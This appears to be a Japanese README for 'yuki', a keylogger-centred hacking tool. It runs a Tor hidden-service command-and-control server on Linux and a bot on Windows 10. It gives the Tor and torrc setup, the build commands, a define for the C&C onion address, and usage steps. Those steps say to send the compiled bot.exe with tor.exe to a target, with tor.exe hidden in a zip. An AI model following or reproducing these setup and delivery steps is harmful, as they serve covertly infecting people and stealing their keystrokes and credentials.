# yuki
keylogger搭載してるというか、それに特化したハッキングツール。<br>

ちなみに、カレントディレクトリの表示は動作確認用

## 動作環境
### C&C
* Linux (Debian)
### Bot
* Windows 10

## 注意
使用するとき、仮想マシンが必須になるかもしれません。

## コンパイル
WindowsとLinuxと同時に使って環境構築をしていきます。<br>
まずは、Linuxから設定をしていきます。<br>

Torをインストール
```
$ sudo apt install tor
```
インストールが終わったらtorrcを編集します。
```
$ sudo vi /etc/tor/torrc
```
ソースコードの関係上以下の通りに書き換えてください。
```
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
```
ここでほぼほぼLinuxでの設定は完了します。<br>
では、以下のコマンドを実行しちゃって終わらせちゃいましょう。
```
$ bash build.sh
```
ちなみに、onionサイトのドメイン名を確認するには
```
$ sudo cat /var/lib/tor/hidden_service/hostname
```

<br>
次は、Windowsにうつって環境構築していきます。<br>
ぶっちゃけて言うとクロスコンパイラ使えば問題ないと思いますが、めいんどいので今回は解説しません。<br>

まず、botというディレクトリのなかのmain.cppを開きます。<br>

そしたら、xxxxxxxxxxxxxxxxxxxxxxxxxxx.onionをcncサーバのドメイン名に書き換えてください。
```c
#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
```
終わったらbuild.batを実行してコンパイル終了です。

## 使い方
必ず最初にLinuxでcnc.outを実行してください。
```
$ ./cnc.out
```
そしたら、コンパイルしたbot.exeとtor.exeを同時にターゲットに送信してください。<br>
そのときにtor.exeを隠しファイルに設定してzipファイルにして送るといいことがあります。
